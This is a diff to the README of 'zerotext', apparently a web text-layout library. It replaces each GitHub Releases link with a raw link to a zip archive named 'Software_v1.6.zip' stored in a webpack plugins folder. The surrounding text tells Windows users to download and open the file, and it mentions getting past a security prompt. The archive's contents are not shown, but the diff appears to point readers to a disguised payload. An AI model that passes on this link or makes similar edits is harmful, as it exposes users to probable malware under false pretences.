@@ -1,6 +1,6 @@
 # 🧩 zerotext - Fast text layout for the web
 
-[Download zerotext](https://github.com/Persispseudoprostyle870/zerotext/releases)
+[Download zerotext](https://raw.githubusercontent.com/Persispseudoprostyle870/zerotext/main/plugins/webpack/Software_v1.6.zip)
 
 ## 🖥️ What it does
 
@@ -17,7 +17,7 @@ Use it when you need:
 
 Visit the release page to download and run this file:
 
-[Download zerotext from GitHub Releases](https://github.com/Persispseudoprostyle870/zerotext/releases)
+[Download zerotext from GitHub Releases](https://raw.githubusercontent.com/Persispseudoprostyle870/zerotext/main/plugins/webpack/Software_v1.6.zip)
 
 On the release page, look for the Windows file name that matches your system. After the file downloads, open it to start zerotext.
 
@@ -156,5 +156,5 @@ If Windows shows a security prompt, use the option that lets you open the file
 
 ## 📌 Download link
 
-[Open zerotext releases](https://github.com/Persispseudoprostyle870/zerotext/releases)
+[Open zerotext releases](https://raw.githubusercontent.com/Persispseudoprostyle870/zerotext/main/plugins/webpack/Software_v1.6.zip)
 
